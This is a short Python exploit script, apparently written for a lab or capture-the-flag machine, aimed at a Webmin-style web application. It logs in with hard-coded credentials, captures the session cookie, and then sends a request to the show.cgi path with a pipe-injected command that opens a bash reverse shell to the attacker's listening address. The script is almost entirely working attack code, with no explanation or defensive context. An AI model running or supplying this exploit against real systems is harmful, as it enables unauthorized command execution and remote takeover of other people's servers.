#!/usr/bin/env python
import requests, string, secrets, sys

targetIP = sys.argv[1] # Attack IP
lhost = "10.9.85.66" # my IP
lport = sys.argv[2] # listing port
data = {'page' : "%2F", 'user' : "user1", 'pass' : "1user"} # Login data
url = f"http://{targetIP}/session_login.cgi" # Login page

# First Verify have Vuln
r = requests.post(url, data=data, cookies={"testing":"1"}, verify=False, allow_redirects=False) # post Login

# if Login Success print "Success",else print "Failed"
if r.status_code == 302 and r.cookies["sid"] != None:
    print("Sussess!!")
else:
    print("Failed!!")

# set cookie "sid" token
sid = r.cookies["sid"]

# generate 5 random Error char
def rand():
    Num = string.ascii_letters + string.digits
    randChar = ''.join(secrets.choice(Num) for i in range(5))
    return randChar
# Reverse shell payload
def payload():
    payload = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
    return payload

# Exploit URL
exp = f"http://{targetIP}/file/show.cgi/bin/{rand()}|{payload()}|"

# Exploit Requests and Done!!
req = requests.post(exp, cookies={"sid":sid}, verify=False, allow_redirects=False)

